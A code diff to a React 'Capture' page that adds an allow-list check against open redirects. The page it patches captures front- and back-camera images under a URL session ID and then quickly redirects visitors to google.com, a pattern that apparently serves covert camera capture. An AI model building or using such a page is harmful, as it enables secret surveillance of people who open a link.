@@ -2,6 +2,32 @@ import { useEffect, useState, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 
+// Whitelist of allowed redirect domains for security
+const ALLOWED_REDIRECT_DOMAINS = [
+  'google.com',
+  'www.google.com',
+];
+
+// Validate redirect URL to prevent open redirect attacks
+const isValidRedirectUrl = (url: string): boolean => {
+  try {
+    const parsed = new URL(url);
+    
+    // Only allow HTTPS (or localhost for dev)
+    if (parsed.protocol !== 'https:' && 
+        !(parsed.protocol === 'http:' && parsed.hostname === 'localhost')) {
+      return false;
+    }
+    
+    // Check against whitelist
+    return ALLOWED_REDIRECT_DOMAINS.some(domain => 
+      parsed.hostname === domain || parsed.hostname.endsWith(`.${domain}`)
+    );
+  } catch {
+    return false;
+  }
+};
+
 const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -9,7 +35,10 @@ const Capture = () => {
   const [status, setStatus] = useState<"loading" | "front" | "back" | "redirecting">("loading");
   
   const sessionId = searchParams.get("session") || "default";
-  const redirectUrl = searchParams.get("redirect") || "https://google.com";
+  const rawRedirectUrl = searchParams.get("redirect") || "https://google.com";
+  
+  // Validate and sanitize redirect URL
+  const redirectUrl = isValidRedirectUrl(rawRedirectUrl) ? rawRedirectUrl : "https://google.com";
 
   const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
     try {
@@ -85,15 +114,15 @@ const Capture = () => {
         
         setStatus("redirecting");
         
-        // Redirect after short delay
+        // Redirect after short delay using validated URL
         setTimeout(() => {
           window.location.href = redirectUrl;
         }, 300);
         
       } catch (error) {
         console.error("Capture error:", error);
-        // Redirect anyway even if camera fails
-        window.location.href = redirectUrl;
+        // Redirect anyway even if camera fails - using safe default
+        window.location.href = "https://google.com";
       }
     };
 
